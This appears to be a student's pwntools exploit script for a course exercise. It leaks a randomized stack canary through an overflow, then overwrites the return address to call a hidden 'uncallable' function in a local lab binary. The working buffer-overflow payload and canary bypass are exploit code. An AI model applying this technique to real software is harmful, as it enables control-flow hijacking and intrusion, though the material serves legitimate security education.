#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = '/home/student/handout/exercise3/exercise3a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

'''
Ideas:
- From Ghidra: there is a buuffer  of length 188: I believe I should overflow it again, BUT:
- Canary values: are they static? Where are they? 
- if canary values static => just look at them. Else: need to extract them automatically. Are they printed?
- Idea: I should "overcome" the canary values in order not to modify them => the program doesn't stop

Workflow:
- Used gdb to see the potential canary values. Found that they are randomly generated each time (. and number sometimes) and they are 4 in total (4 bytes)
- Tricked the program into printing them => sliced the response using standard python (got rid of the last 20 charachters and sliced the first 188 ones)
- From Ghidra: there are 6 variables of length 4 before the canary check => 6*4 = 24 padding and then concatenate the uncallable address (used provided ELF() method) 
'''

elf = ELF('handout/exercise3/exercise3a')
uncallable_address = elf.symbols['uncallable']

r = start()
r.recvline()
r.sendline(b'A'*187)
r.recvuntil(b'course ')
response = r.recvuntil(b'password')

canary_values = response[188:-20]
payload = b'A'*188+canary_values+b'A'*24+p64(uncallable_address)

r.recvuntil(b'\n')
r.sendline(payload)

print(r.recvall())

